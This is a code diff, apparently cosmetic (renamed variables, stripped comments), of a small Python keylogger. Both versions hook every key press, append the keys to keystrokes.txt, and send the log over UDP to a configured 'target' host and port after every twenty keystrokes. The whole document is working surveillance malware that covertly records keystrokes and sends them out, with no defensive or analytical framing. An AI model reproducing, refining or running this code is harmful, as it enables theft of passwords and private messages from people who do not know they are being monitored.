@@ -1,28 +1,28 @@
 import keyboard
 import socket
 
-HOST = '127.0.0.1'  # Example target host
-PORT = 3008        # Example target port
-number_of_logs = 0
+host = '127.0.0.1'  
+port = 3008        
+logs = 0
 log_file = 'keystrokes.txt'
 
-def on_key_press(event):
-    global number_of_logs
-    print("Key pressed")
+def keypress(event):
+    global logs
+    print("key pressed")
     with open(log_file, 'a') as f:
-        f.write('{}\n'.format(str(event.name)))  # Cast to string
-    number_of_logs += 1
-    print("Number of logs:", number_of_logs)
+        f.write('{}\n'.format(str(event.name)))  
+    logs += 1
+    print("number of logs:", logs)
 
-    if number_of_logs == 20:
-        print("Sending logs...")
-        with open(log_file, 'rb') as f:  # Read the log file
+    if logs == 20:
+        print("sending logs...")
+        with open(log_file, 'rb') as f:  
             data = f.read()
         client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        client.sendto(data, (HOST, PORT))  # Send the actual content
-        number_of_logs = 0
-        print("Logs sent")
+        client.sendto(data, (host, port)) 
+        logs = 0
+        print("logs sent")
 
-keyboard.on_press(on_key_press)
-print("Listening for keystrokes...")
+keyboard.on_press(keypress)
+print("listening for keystrokes...")
 keyboard.wait()
